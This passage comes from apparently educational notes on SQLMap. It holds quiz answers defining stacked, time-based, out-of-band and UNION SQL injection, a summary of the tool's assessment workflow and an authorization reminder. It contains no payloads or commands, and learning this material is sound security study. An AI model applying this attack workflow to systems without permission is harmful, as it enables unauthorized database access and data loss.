### Q6. What are stacked queries?

Multiple SQL statements executed sequentially when the database/application stack supports them.

### Q7. What is Time-based blind SQLi?

A blind SQLi technique where response timing is used to infer whether a condition is TRUE or FALSE.

### Q8. What is Out-of-Band SQLi?

A technique where the result is obtained through a separate communication channel, such as DNS or HTTP.

### Q9. Why is Time-based SQLi slow?

Because intentional delays are introduced into responses and many requests may be required.

### Q10. Why can UNION-based SQLi be fast?

Because, when the application's output reflects injected query results, substantial information can sometimes be returned through relatively few requests.

---

# 47. Final Summary

SQLMap is essentially an **automation framework for SQL injection assessment**.

Its core job can be summarized as:

```text
Find SQLi
   ↓
Understand the DBMS
   ↓
Determine viable injection techniques
   ↓
Enumerate database structure
   ↓
Retrieve information
   ↓
Use advanced functionality when the environment permits
```

The most important concepts to understand are:

```text
Boolean → TRUE/FALSE difference
Error   → Database error
UNION   → Reflected query output
Stacked → Multiple SQL statements
Time    → Response delay
Inline  → Query inside query
OOB     → External communication
```

### The single most important concept

> **Different SQL injection techniques are primarily different ways of observing the result of an injected SQL condition/query.**

If you understand **what signal the application/database gives you**, choosing and understanding the SQLi technique becomes much easier.

---

## Authorization Reminder

SQLMap is a powerful penetration-testing tool. Use it only against:

- Your own systems
    
- Authorized penetration-testing targets
    
- CTF/HTB/academy labs
    
- Systems where you have explicit permission
    

Unauthorized SQL injection testing can cause data loss, service disruption, or unauthorized access.

**Visual references:** the diagrams above illustrate the relationship between in-band, blind, and out-of-band SQLi, while the terminal image shows the kind of SQLMap output you can expect during an assessment. The SQLMap project also documents its injection techniques and blind-inference behavior. ([GitHub](https://github.com/sqlmapproject/sqlmap/wiki/Techniques/df3882c51861bef399fb4582912c4f052c352dd1?utm_source=chatgpt.com "Techniques · sqlmapproject/sqlmap Wiki · GitHub"))